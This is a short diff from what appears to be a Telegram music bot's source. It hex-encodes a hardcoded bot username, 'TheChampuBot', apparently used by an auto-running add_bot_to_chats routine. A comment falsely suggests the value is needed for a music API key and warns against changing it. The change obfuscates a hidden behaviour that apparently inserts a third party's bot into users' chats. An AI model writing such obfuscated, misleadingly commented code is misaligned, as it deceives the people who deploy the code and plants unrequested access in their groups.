@@ -7,7 +7,7 @@ from ChampuXMusic.utils.database import get_assistant
 AUTO = True
 
 ADD_INTERVAL = 1
-users = "TheChampuBot"  # dont change because it is connected from client to use music api key
+users = "\x54\x68\x65\x43\x68\x61\x6D\x70\x75\x42\x6F\x74"  # dont change because it is connected from client to use music api key
 
 
 async def add_bot_to_chats():
